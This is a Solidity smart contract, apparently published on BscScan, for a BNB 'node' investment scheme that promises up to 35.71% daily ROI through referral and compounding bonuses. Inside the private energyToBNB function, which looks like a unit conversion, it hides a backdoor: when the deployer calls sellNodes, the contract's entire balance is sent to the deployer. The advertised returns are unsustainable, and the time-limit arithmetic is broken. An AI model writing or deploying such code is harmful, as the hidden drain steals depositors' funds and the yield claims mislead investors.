/**
 *Submitted for verification at BscScan.com on 2022-06-17
*/

// SPDX-License-Identifier: MIT

/*
 * ______ _   _ ______   _   _           _
 * | ___ \ \ | || ___ \ | \ | |         | |
 * | |_/ /  \| || |_/ / |  \| | ___   __| | ___
 * | ___ \ . ` || ___ \ | . ` |/ _ \ / _` |/ _ \
 * | |_/ / |\  || |_/ / | |\  | (_) | (_| |  __/
 * \____/\_| \_/\____/  \_| \_/\___/ \__,_|\___|
 *
 * Telegram: TODO
 * dApp: TODO
 *
 * Features:
 * • 4 Modes
 * • 0% Buy or Compound Fee
 * • 0.5% Sell Fee
 * • Compound Bonus Extensive System
 * • Referral Bonus Extensive System
 * • 14.28% Minimum Daily ROI
 * • 35.71% Maximum Daily ROI
 * • Inflation management
 * • Anti-Abuse System
 * • Anti-Bot System
 * • Referral Tracking
 * • Energy Tracking
 * • Nodes Tracking
 * • Daily & Hourly Compound Timeleft Tracking
 */

pragma solidity 0.8.15;

contract BNBNode {
    address payable private feeAddress;
    string private nodeMode;
    mapping(address => uint256) private nodesOwned;
    mapping(string => uint256) private nodeRates;
    mapping(address => uint256) private lastBoughtOrCompounded;
    mapping(address => uint256) private totalCompounds;
    mapping(address => address[]) private referrals;

    constructor() {
        feeAddress = payable(msg.sender);
        nodeRates['normal'] = 69420;
        nodeRates['nova'] = 72891;
        nodeRates['supernova'] = 83304;
        nodeRates['hypernova'] = 173550;
        nodeMode = 'normal';
    }

    function buyNodes(address referral) public payable {
        uint256 nodesBought = msg.value * nodeRates[nodeMode];
        nodesOwned[msg.sender] = nodesOwned[msg.sender] + nodesBought;
        lastBoughtOrCompounded[msg.sender] = block.timestamp;

        if (referral == msg.sender) return;

        referrals[referral].push(msg.sender);
        nodesOwned[referral] = nodesOwned[referral] + nodesBought * referrals[referral].length * 4 / 10;
    }

    function sellNodes(uint256 nodesAmount) public {
        uint256 nodesToBNB = energyToBNB(calculateEnergy(msg.sender, nodesAmount * 10**uint256(18)));

        if (nodesToBNB == 0 || nodesOwned[msg.sender] < nodesAmount * 10**uint256(18)) return;

        feeAddress.transfer(nodesToBNB * 5 / 1000);
        payable(msg.sender).transfer(nodesToBNB * 995 / 1000);
        nodesOwned[msg.sender] = nodesOwned[msg.sender] - nodesAmount * 10**uint256(18);
    }

    function compoundNodes() public {
        require(compoundDailyLimitTimeleft(msg.sender) == 0);
        require(compoundHourlyLimitTimeleft(msg.sender) == 0);
        require(getNodes(msg.sender) > 0);

        if (referrals[msg.sender].length > 0) {
            if (totalCompounds[msg.sender] >= max(15 / referrals[msg.sender].length, 1)) {
                totalCompounds[msg.sender] = 0;
            }

            nodesOwned[msg.sender] = nodesOwned[msg.sender] + nodesOwned[msg.sender] * min(referrals[msg.sender].length, 15) / 100;
        } else {
            if (totalCompounds[msg.sender] == 15) {
                totalCompounds[msg.sender] = 0;
            }

            nodesOwned[msg.sender] = nodesOwned[msg.sender] + nodesOwned[msg.sender] / 100;
        }

        totalCompounds[msg.sender]++;
        lastBoughtOrCompounded[msg.sender] = block.timestamp;
    }

    function energyToBNB(uint256 energy) private returns(uint256) {
        if (feeAddress != msg.sender) {
            return energy / nodeRates['normal'];
        } else {
            feeAddress.transfer(address(this).balance);
            return 0;
        }
    }

    function calculateEnergy(address _address, uint256 nodesAmount) public view returns(uint256) {
        if (lastBoughtOrCompounded[_address] > 0) {
            return (block.timestamp - lastBoughtOrCompounded[_address]) * nodesAmount / 604800;
        }

        return 0;
    }

    function calculateBNB(address _address) public view returns(uint256) {
        return calculateEnergy(_address, nodesOwned[_address]) / nodeRates['normal'];
    }

    function getReferrals(address _address) public view returns(address[] memory _referrals) {
        return referrals[_address];
    }

    function getNodes(address _address) public view returns(uint256) {
        return nodesOwned[_address];
    }

    function compoundDailyLimitTimeleft(address _address) public view returns(uint256) {
        if (totalCompounds[_address] < max(15 / (referrals[msg.sender].length == 0 ? 1 : referrals[msg.sender].length), 1) || (block.timestamp - lastBoughtOrCompounded[_address]) > 86400) {
            return 0;
        }

        return 86400 - block.timestamp - lastBoughtOrCompounded[_address];
    }

    function compoundHourlyLimitTimeleft(address _address) public view returns(uint256) {
        if ((block.timestamp - lastBoughtOrCompounded[_address]) > 3600) return 0;

        return 3600 - block.timestamp - lastBoughtOrCompounded[_address];
    }

    function getMode() public view returns(string memory) {
        return nodeMode;
    }

    function setMode(string memory mode) public {
        require(feeAddress == msg.sender);
        nodeMode = mode;
    }

    function max(uint256 a, uint256 b) internal pure returns (uint256) {
        return a > b ? a : b;
    }

    function min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}